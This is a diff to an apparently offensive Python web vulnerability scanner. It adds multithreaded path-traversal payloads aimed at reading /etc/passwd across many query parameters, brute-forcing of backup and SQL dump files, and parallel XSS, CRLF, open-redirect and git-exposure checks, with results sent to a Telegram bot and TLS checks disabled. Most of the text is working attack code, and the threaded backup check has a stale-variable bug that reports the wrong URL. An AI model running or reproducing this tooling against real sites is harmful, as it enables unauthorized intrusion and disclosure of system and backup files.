@@ -9,7 +9,7 @@ from core import bot
 
 from requests.packages import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
-
+threads =30
 
 USR_AGENTS=[
 'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE51-1/220.34.37; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413', 
@@ -47,7 +47,12 @@ USR_AGENTS=[
 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9a8) Gecko/2007100619 GranParadiso/3.0a8', 
 ]
 
-
+def build_wordlist(urls):
+    words= queue.Queue()
+    for word in urls:
+        word = word.rstrip()
+        words.put(word)
+    return words
 
 
 
@@ -167,6 +172,7 @@ def openredaraction_(i):
             pass
 
 def lfi_(i):
+    ul=i
     pay=["/?q=../../../etc/passwd&s=../../../etc/passwd&search=../../../etc/passwd&id=&action=../../../etc/passwd&keyword=../../../etc/passwd&query=../../../etc/passwd&page=../../../etc/passwd&keywords=../../../etc/passwd&url=../../../etc/passwd&view=../../../etc/passwd&cat=../../../etc/passwd&name=../../../etc/passwd&key=../../../etc/passwd&p=../../../etc/passwd",
     "/?q=../../../etc/passwd%00&s=../../../etc/passwd%00&search=../../../etc/passwd%00&id=../../../etc/passwd%00&action=../../../etc/passwd%00&keyword=../../../etc/passwd%00&query=../../../etc/passwd%00&page=../../../etc/passwd%00&keywords=../../../etc/passwd%00&url=../../../etc/passwd%00&view=../../../etc/passwd%00&cat=../../../etc/passwd%00&name=../../../etc/passwd%00&key=../../../etc/passwd%00&p=../../../etc/passwd%00",
     "/?q=%252e%252e%252fetc%252fpasswd&s=%252e%252e%252fetc%252fpasswd&search=%252e%252e%252fetc%252fpasswd&id=%252e%252e%252fetc%252fpasswd&action=%252e%252e%252fetc%252fpasswd&keyword=%252e%252e%252fetc%252fpasswd&query=%252e%252e%252fetc%252fpasswd&page=%252e%252e%252fetc%252fpasswd&keywords=%252e%252e%252fetc%252fpasswd&url=%252e%252e%252fetc%252fpasswd&view=%252e%252e%252fetc%252fpasswd&cat=%252e%252e%252fetc%252fpasswd&name=%252e%252e%252fetc%252fpasswd&key=%252e%252e%252fetc%252fpasswd&p=%252e%252e%252fetc%252fpasswd",
@@ -213,22 +219,44 @@ def lfi_(i):
     ]
     rg1="root:[x*]:0:0:"
     rg2="\\[(font|extension|file)s\\]"
-    for x in pay:
-        x=x.rstrip()
-        url=i+x
-        try:
-            r = requests.head(url,verify=False)
-            resp = r.content
-            x1 = re.findall(rg1, str(resp))
-            x2 = re.findall(rg2, str(resp))
-            if (x1) or (x2):
-                print('\033[91mPossibly LFI vulnerability\033[00m  '+url)
-                msg="Possibly LFI vulnerability "+url
-                bot.telegram_bot_sendtext(msg)
-        except:
-            pass
+    word_queue = build_wordlist(pay)
+    def explfi():
+        while not word_queue.empty():
+            attempt = word_queue.get()
+            attempt_list = []
+            attempt_list.append(attempt)
+            for brute in attempt_list:
+                url=str(ul)+str(brute) 
+                
+                try:
+                    r = requests.head(url,verify=False)
+                    scode=r.status_code
+                    resp = r.content
+                   
+                    x1 = re.findall(rg1, str(resp))
+                    x2 = re.findall(rg2, str(resp))
+                    if (x1) or (x2):
+                        print('\033[91mPossibly LFI vulnerability\033[00m  '+url)
+                        msg="Possibly LFI vulnerability "+url
+                        bot.telegram_bot_sendtext(msg)
+                except:
+                    pass
+                    
+    for i in range(threads):
+         t = threading.Thread(target=explfi,args=())
+         t.start()
+     
+    
+    
+        
 
 def backupfile_(i):
+    
+    
+    try:
+       i=i.replace(':80','')
+    except:
+       pass
     filename=[]
     ext=['.tar','.rar','.zip','.tmp','.tar.gz','.sql.gz','.bak.sql','.bak.sql.gz', '.bak.sql.bz2','.bak.sql.tar.gz','.txt','.bak','.bak1','.bakup','.bakup1',  '.bkp','.save','.old','.orig','.original','.sql','.tpl','.tmp','.temp','.saved','.back','.bck','.bakup','.nsx','.cs','.csproj',
     '.vb','.0','.1','.2','.arc','.inc','.lst',]
@@ -243,6 +271,9 @@ def backupfile_(i):
                 b=str_[-x]
                 rs+=b
         return rs
+        
+    
+         
 
     subdomainmame=i.split('/')[2]
     filename.append(subdomainmame)
@@ -276,24 +307,56 @@ def backupfile_(i):
         test_scode=test_r.status_code
     except:
           pass
-    for url in urls:
-        try:
-            r = requests.head(url,verify=False)
-            scode=r.status_code
-            if '2' in str(scode) :
-                if str(scode) != str(test_scode):
-                    print("\033[94m[+] Possibly backup file disclosure :\033[00m  "+url)
-        except:
-            pass
+    
+         
+    
+        
+         
+    word_queue = build_wordlist(urls)
+    def expbf():
+          while not word_queue.empty():
+            attempt = word_queue.get()
+            attempt_list = []
+            attempt_list.append(attempt)
+            for brute in attempt_list:
+                #print(brute) 
+                try:
+                     r = requests.head(brute,verify=False)
+                     scode=r.status_code
+                     
+                     if '2' in str(scode) :
+                            if str(scode) != str(test_scode):
+                                print("\033[94m[+] Possibly backup file disclosure :\033[00m  "+url)
+                except:
+                    pass
+                    
+    for i in range(threads):
+         t = threading.Thread(target=expbf,args=())
+         t.start()
+     
 
 def run(i):
-    #backupfile_(i)
-    lfi_(i)
-    openredaraction_(i)
-    crlf_(i)
-    git_(i)
-    xss_(i)
+    try:
+       i=i.replace(':80','')
+    except:
+       pass
+    p1 = Process(target=lfi_, args=(i,))
+    p1.start()
+    p2 = Process(target=openredaraction_, args=(i,))
+    p2.start()
+    p3= Process(target=crlf_, args=(i,))
+    p3.start()
+    p4 = Process(target=git_, args=(i,))
+    p4.start()
+    p5 = Process(target=xss_, args=(i,))
+    p5.start()
+    p6 = Process(target=backupfile_, args=(i,))
+    p6.start()
    
-             
-
+   
+    
+    
+  
+  
+        
 
